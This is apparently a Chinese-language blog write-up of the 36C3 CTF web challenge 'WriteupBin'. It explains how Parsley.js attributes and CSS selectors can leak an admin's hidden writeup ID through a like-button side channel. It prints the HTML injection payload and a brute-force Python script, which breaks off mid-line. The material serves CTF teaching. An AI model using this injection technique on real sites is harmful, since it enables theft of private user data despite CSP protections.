<strong>455</strong> points</p><p><strong>Description:</strong></p><p>Finally (again), a minimalistic, open-source social writeup hosting solution.</p><p><strong>Download:</strong></p><p><a href="https://github.com/ZeddYu/36c3-CTF-Web/blob/master/writeupbin/WriteupBin-10b65573b511269f.tar.xz" target="_blank" rel="noopener">WriteupBin-10b65573b511269f.tar.xz</a></p></blockquote><p>一道比较有意思的侧信道题目，我们可以通过所给附件搭建形式知道，flag 存放在数据库当中，并且是在 admin 用户的第一条 writeup 数据的内容当中，题目提供简单的上传文本的功能，并且可以提交给 admin ，让 admin 给你点赞。</p><p>项目结构如下：</p><p></p><figure class="highlight stylus hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── Dockerfile<span class="hljs-comment">//Docker文件</span></span><br><span class="line">├── admin<span class="hljs-selector-class">.py</span><span class="hljs-comment">//使用selenium模拟admin登录并点赞</span></span><br><span class="line">├── db<span class="hljs-selector-class">.sql</span><span class="hljs-comment">//数据库文件</span></span><br><span class="line">├── docker-stuff</span><br><span class="line">│&nbsp;&nbsp; ├── default<span class="hljs-comment">//配置文件</span></span><br><span class="line">│&nbsp;&nbsp; └── www<span class="hljs-selector-class">.conf</span><span class="hljs-comment">//配置文件</span></span><br><span class="line">├── www</span><br><span class="line">│&nbsp;&nbsp; ├── general<span class="hljs-selector-class">.php</span><span class="hljs-comment">//连接数据库设置header头等一些初始化操作</span></span><br><span class="line">│&nbsp;&nbsp; ├── html</span><br><span class="line">│&nbsp;&nbsp; │&nbsp;&nbsp; ├── add<span class="hljs-selector-class">.php</span><span class="hljs-comment">//添加writeup相关操作</span></span><br><span class="line">│&nbsp;&nbsp; │&nbsp;&nbsp; ├── admin<span class="hljs-selector-class">.php</span><span class="hljs-comment">//把writeup提交给admin</span></span><br><span class="line">│&nbsp;&nbsp; │&nbsp;&nbsp; ├── index<span class="hljs-selector-class">.php</span><span class="hljs-comment">//入口文件</span></span><br><span class="line">│&nbsp;&nbsp; │&nbsp;&nbsp; ├── like<span class="hljs-selector-class">.php</span><span class="hljs-comment">//点赞操作</span></span><br><span class="line">│&nbsp;&nbsp; │&nbsp;&nbsp; ├── login_admin<span class="hljs-selector-class">.php</span><span class="hljs-comment">//admin登陆操作</span></span><br><span class="line">│&nbsp;&nbsp; │&nbsp;&nbsp; └── show<span class="hljs-selector-class">.php</span><span class="hljs-comment">//获取writeup内容</span></span><br><span class="line">│&nbsp;&nbsp; └── views</span><br><span class="line">│&nbsp;&nbsp;     ├── <span class="hljs-selector-tag">header</span><span class="hljs-selector-class">.php</span><span class="hljs-comment">//在页面上方展示目前id提交的writeup</span></span><br><span class="line">│&nbsp;&nbsp;     ├── home<span class="hljs-selector-class">.php</span><span class="hljs-comment">//页面中部用来提供给用户输入的界面</span></span><br><span class="line">│&nbsp;&nbsp;     └── show<span class="hljs-selector-class">.php</span><span class="hljs-comment">//点赞、提交给admin的展示页面</span></span><br><span class="line">└── ynetd<span class="hljs-comment">//用来启动 admin.py</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>既然 flag 在数据库当中，那我们可以首先来看看 show.php ，因为这个文件可以直接用来获取 writeup 的内容。</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line"><span class="hljs-keyword">include_once</span> <span class="hljs-string">'../general.php'</span>;</span><br><span class="line"></span><br><span class="line">$stmt = $db-&gt;prepare(<span class="hljs-string">'SELECT id, content FROM `writeup` WHERE `id` = ?'</span>);</span><br><span class="line">$stmt-&gt;bind_param(<span class="hljs-string">'s'</span>, $_GET[<span class="hljs-string">'id'</span>]);</span><br><span class="line">$stmt-&gt;execute();</span><br><span class="line">$writeup = mysqli_fetch_all($stmt-&gt;get_result(), MYSQLI_ASSOC)[<span class="hljs-number">0</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$stmt = $db-&gt;prepare(<span class="hljs-string">'SELECT user_id FROM `like` WHERE `writeup_id` = ?'</span>);</span><br><span class="line">$stmt-&gt;bind_param(<span class="hljs-string">'s'</span>, $_GET[<span class="hljs-string">'id'</span>]);</span><br><span class="line">$stmt-&gt;execute();</span><br><span class="line">$result = $stmt-&gt;get_result();</span><br><span class="line">$likes = mysqli_fetch_all($result, MYSQLI_ASSOC);</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">include</span>(<span class="hljs-string">'../views/header.php'</span>);</span><br><span class="line"><span class="hljs-keyword">include</span>(<span class="hljs-string">'../views/show.php'</span>);</span><br></pre></td></tr></tbody></table></figure><p></p><p>我们可以看到 id 并没有什么鉴权措施，也就是说，我们可以通过 writeup id 来获取 writeup 内容，而 flag writeup id 在 admin 用户数据当中，而在 header.php 中可以看到当前用户所有的 writeup id</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">foreach</span>($writeups <span class="hljs-keyword">as</span> $w): <span class="hljs-meta">?&gt;</span></span><br><span class="line">  &lt;li&gt;&lt;a href=<span class="hljs-string">"/show.php?id=&lt;?= $w['id'] ?&gt;"</span>&gt;Writeup - <span class="hljs-meta">&lt;?</span>= $w[<span class="hljs-string">'id'</span>] <span class="hljs-meta">?&gt;</span>&lt;/a&gt;&lt;/li&gt;</span><br><span class="line"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">endforeach</span>; <span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>既然有提交代码给 admin 的功能，那么是不是有可能是一个 xss 或者什么的？</p><p>我们还可以看到 admin 再收到 writeup 后的主要操作：</p><p></p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">display = Display(visible=<span class="hljs-number">0</span>, size=(<span class="hljs-number">800</span>, <span class="hljs-number">600</span>))</span><br><span class="line">display.start()</span><br><span class="line">chrome_options = Options()</span><br><span class="line">chrome_options.add_argument(<span class="hljs-string">'--disable-gpu'</span>)</span><br><span class="line">chrome_options.add_argument(<span class="hljs-string">'--headless'</span>)</span><br><span class="line">chrome_options.add_argument(<span class="hljs-string">'--no-sandbox'</span>)</span><br><span class="line">driver = webdriver.Chrome(<span class="hljs-string">'/usr/bin/chromedriver'</span>, options=chrome_options)</span><br><span class="line"></span><br><span class="line">url = <span class="hljs-string">'http://admin:__ADMIN_TOKEN__@127.0.0.1/login_admin.php?id='</span>+writeup_id</span><br><span class="line">driver.get(url)</span><br><span class="line">element = driver.find_element_by_xpath(<span class="hljs-string">'//input[@id="like"]'</span>)</span><br><span class="line">element.click()</span><br><span class="line"></span><br><span class="line">driver.quit()</span><br><span class="line">display.stop()</span><br></pre></td></tr></tbody></table></figure><p></p><p>我们可以看到 admin 在进行登录之后使用<code>find_element_by_xpath</code>找到了 id 为 like 的 input 标签，并进行了点击，也就是提交给 admin 的 writeup 后，admin 会浏览进行点击，发送一个点赞请求</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">method</span>=<span class="hljs-string">"post"</span> <span class="hljs-attr">action</span>=<span class="hljs-string">"/like.php"</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"hidden"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"c"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"&lt;?= $_SESSION['c'] ?&gt;"</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"hidden"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"id"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"&lt;?= $writeup['id'] ?&gt;"</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"like"</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"submit"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"👍"</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>接着我们来看看 general.php 中的防御措施</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line">session_start([<span class="hljs-string">'cookie_httponly'</span> =&gt; <span class="hljs-keyword">true</span>, <span class="hljs-string">'cookie_samesite'</span> =&gt; <span class="hljs-string">'Strict'</span>]);</span><br><span class="line"><span class="hljs-comment">//...</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">id</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">return</span> bin2hex(random_bytes(<span class="hljs-number">8</span>));</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">$nonce = base64_encode(id());</span><br><span class="line"><span class="hljs-comment">//...</span></span><br><span class="line">header(<span class="hljs-string">'x-xss-protection: 1; mode=block'</span>);</span><br><span class="line">header(<span class="hljs-string">'X-Content-Type-Options: nosniff'</span>);</span><br><span class="line">header(<span class="hljs-string">'x-frame-options: DENY'</span>);</span><br><span class="line">header(<span class="hljs-string">'Referrer-Policy: no-referrer'</span>);</span><br><span class="line">header(<span class="hljs-string">"Feature-Policy: geolocation 'none'; midi 'none'; sync-xhr 'none'; microphone 'none'; camera 'none'; magnetometer 'none'; gyroscope 'none'; speaker 'none'; fullscreen 'none'; payment 'none'; usb 'none'; vr 'none'; encrypted-media 'none'"</span>);</span><br><span class="line">header(<span class="hljs-string">"Content-Security-Policy: default-src 'none'; script-src 'nonce-"</span>.$nonce.<span class="hljs-string">"' https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.0/jquery.min.js https://cdnjs.cloudflare.com/ajax/libs/parsley.js/2.8.2/parsley.min.js; base-uri 'self'; form-action 'self'; frame-ancestors 'none'; require-sri-for script style;"</span>);</span><br></pre></td></tr></tbody></table></figure><p></p><p>而<code>script-src</code>设置的 nonce 只在 header.php 使用了，而且我们也拿不到这个 nonce</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script nonce=<span class="hljs-string">"&lt;?=$nonce?&gt;"</span>&gt;</span><br><span class="line">    $(<span class="hljs-string">'#publish-form'</span>).parsley() <span class="hljs-comment">// prevent hacking</span></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></tbody></table></figure><p></p><p>所以我们可能需要往点击事件那一方面思考，并且利用题目引入的两个 js 文件入手，一个 jquery.js ，另一个 parsley.js。</p><h3 id="Parsley-js"><a href="#Parsley-js" class="headerlink" title="Parsley.js"></a>Parsley.js</h3><p>我们可以去 <a href="https://parsleyjs.org/doc/index.html" target="_blank" rel="noopener">parsley.js doc</a> 看到该 lib 的简单说明以及使用：</p><blockquote><p>Parsley is a javascript form validation library. It helps you provide your users with feedback on their form submission before sending it to your server. It saves you bandwidth, server load and it saves time for your users.</p><p>Javascript form validation is not necessary, and if used, it <strong>does not replace strong backend server validation.</strong></p><p>That’s why Parsley is here: to let you define your general form validation, implement it on the backend side, and simply port it frontend-side, with maximum respect to user experience best practices.</p></blockquote><p>可以看出这是个简单的前端验证库，简单查一下文档，我们可以发现有几个有意思的 API：</p><blockquote><p><strong>data-parsley-trigger=”input”</strong></p><p>Specify one or many javascript events that will trigger item validation, before any failure. To set multiple events, separate them with a space data-parsley-trigger=”focusin focusout”. Default is null. See the various events supported by jQuery.</p><p><strong>data-parsley-error-message=”my message”</strong></p><p>Customize a unique global message for the field.</p><p><strong>data-parsley-errors-container=”#element”</strong></p><p>Specify the existing DOM container where ParsleyUI should put the errors. It is also possible to configure it with a callback function from javascript, see the annotated source.</p></blockquote><p>根据文档，我们可以利用<code>data-parsley-trigger</code>设置我们的触发方式，使用<code>data-parsley-error-message</code>来自定义我们的错误信息，使用<code>data-parsley-errors-container</code>来自定义我们的显示错误的位置。</p><p>根据文档，我们可以简单用一个<code>data-parsley-validate</code>指定我们需要验证的表单，然后利用错误信息把元素标签输出出来，并且我们接着还可以利用指定输出位置来控制输出，例如：</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">data-parsley-validate</span>&gt;</span></span><br><span class="line">        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span> </span></span><br><span class="line"><span class="hljs-tag">            <span class="hljs-attr">data-parsley-trigger</span>=<span class="hljs-string">"blur"</span> <span class="hljs-attr">autofocus</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"some-field"</span></span></span><br><span class="line"><span class="hljs-tag">            <span class="hljs-attr">data-parsley-error-message</span>=<span class="hljs-string">"&lt;input id=like type=button value=padyload&gt;"</span> </span></span><br><span class="line"><span class="hljs-tag">            <span class="hljs-attr">data-parsley-required</span></span></span><br><span class="line"><span class="hljs-tag">            <span class="hljs-attr">data-parsley-errors-container</span>=<span class="hljs-string">"#div1"</span>/&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p><code>data-parsley-trigger</code>指定了<code>blur</code>事件，也就是当我们的 input 失焦时，会显示我们的错误信息，并且在 id 为 div1 的元素中显示，更重要的是，浏览器也将其进行了渲染。</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200108013312.png" alt=""></p><p>###Click</p><p>回到题目当中，admin 所做的动作有两个，一个就是登录，根据题目信息，我们基本上对这个操作没办法进行什么干扰，另外一个就是点赞了，更具体来说就是通过 show.php 打开你的 writeup 内容，并且点击页面上 id 为 like 的 input 标签，所以我们更可能的事对点赞操作进行一个干扰或者其他的操作，并且根据实际测试，通过 <code>selenium.webdriver</code>调用<code>find_element_by_xpath</code>函数得到的 id 为 like 的 input 元素只能有第一个，也就是说，即使我们在 writeup 内容中插入一个 id 为 like 的 input 标签，admin 也只会根据页面顺序拿到第一个点赞 input 。</p><p>并且 CSP 也限制得很严格，似乎陷入了僵局，但是如果我们有以上 parsley.js 的知识，我们似乎可以通过错误信息来构造一些 Payload 。</p><p>首先，因为<code>find_element_by_xpath</code>只会得到第一个 id 为 like 的 input 标签，而我们通过 parsley.js 可以将错误信息输出到指定页面位置，所以我们大概可以有一个想法，把一个没有用的单独的 id 为 like 的 input 标签插入到原来的点赞按钮之前。</p><p>但是这有什么用呢？我们再来仔细看看 admin 要点赞的那个页面</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200108015154.png" alt=""></p><p>页面上部分是 header.php ，会展示当前用户所提交的 writeup ，也就是说 admin 的这个页面，第一个也是唯一一个 a 标签就是 flag 的地址，现在的问题就变成了我们怎么获取这个地址的问题了，更详细的来说，我们如何获取这个 a 标签中的 href 属性值，或者更确切的说就是获取 writeup id 的事情了。</p><h3 id="CSS-Selector"><a href="#CSS-Selector" class="headerlink" title="CSS Selector"></a>CSS Selector</h3><p>如何获取 a 标签中的 href 属性值貌似也就跟我们之前提到的<code>data-parsley-errors-container</code> API 有关了，而这个 API 又支持 CSS 选择器，那我们是不是可以通过 CSS 选择器来让我们的报错信息放到这个 a 标签之后呢，这样以来也就直接就放到了点赞按钮之前了。</p><p>类似之前 XCTF Final 一个 CSS 侧信道的题目，我们可以通过利用<code>a[href^='/show.php?id={flag}]</code>的形式来进行元素选择。</p><p>也就是说，当我们传入的 flag 值与页面中的 href 属性值也就是 writeup id 前部分完全匹配的时候，我们可以把一个无效的 id=like input 标签插入到该 a 标签之后，亦即真正用于提交 like 请求的 input 标签之前；如果我们传入的 flag 值与页面中的 href 属性值也就是 writeup id 前部分不完全匹配的，parsley.js 什么也不会做，admin 会正常地点赞，我们可以正常地在自己的 writeup 页面看到 admin 的点赞。</p><p>所以基于这个差异，我们可以利用这种形式来进行一个侧信道攻击获取 flag 的 writeup id。</p><p>脚本编写也比较简单：</p><p></p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> requests</span><br><span class="line"><span class="hljs-keyword">import</span> time</span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line"></span><br><span class="line">base_url = <span class="hljs-string">"http://ip:8001/"</span></span><br><span class="line"></span><br><span class="line">res = s.get(base_url)</span><br><span class="line"></span><br><span class="line">pos = res.text.find(<span class="hljs-string">'name="c" value="'</span>) + len(<span class="hljs-string">'name="c" value="'</span>)</span><br><span class="line">csrftoken = res.text[pos:pos+<span class="hljs-number">16</span>]</span><br><span class="line"></span><br><span class="line">ss = <span class="hljs-string">"1234567890abcdef"</span></span><br><span class="line">flag = <span class="hljs-string">""</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">16</span>):</span><br><span class="line">    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> ss:</span><br><span class="line">        payload = <span class="hljs-string">f"&lt;form data-parsley-validate&gt;&lt;input data-parsley-required data-parsley-trigger=\"blur\" data-parsley-error-message='&lt;input type=\"input\" id=like value=\"rebirth_is_really_nb\"&gt;' data-parsley-errors-container=\"a[href^='/show.php?id=<span class="hljs-subst">{flag + j}</span>']\" autofocus&gt;&lt;/form&gt;"</span></span><br><span class="line">        data = {<span class="hljs-string">'c'</span>: csrftoken, <span class="hljs-string">'content'</span>: payload}</span><br><span class="line">        res = s.post(base_url + <span class="hljs-string">"add.php"</span>, data=data, allow_redirects=<span class="hljs-literal">False</span>)</span><br><span class="line">        <span class="hljs-comment"># print(res.headers)</span></span><br><span class="line">        location = res.headers[<span class="hljs-string">'Location'</span>]</span><br><span class="line">        pos = location.find(<span class="hljs-string">'id='</span>) + <span class="hljs-number">3</span></span><br><span class="line">        wp = location[pos:]</span><br><span class="line">        data = {<span class="hljs-string">'c'</span>: csrftoken, <span class="hljs-string">'id'</span>: wp}</span><br><span class="line">        res = s.post(base_url + <span class="hljs-string">"admin.php"</span>, data=data)</span><br><span class="line">        time.sleep(<span class="hljs-number">3</span>)</span><br><span class="line"></span><br><span class="line">        res = s.get(<span class="hljs-string">f"http://ip:8001/show.php?id=<span class="hljs-subst">{wp}</span>"</span>)</span><br><span class="line">        <span class="hljs-comment"># print(res.text)</span></span><br><span class="line">        txt = res.text.replace(<span class="hljs-string">"\n"</span>, <span class="hljs-string">""</span>).replace(<span class="hljs-string">"\r"</span>, <span class="hljs-string">""</span>)</span><br><span class="line">        <span class="hljs-keyword">if</span> <span 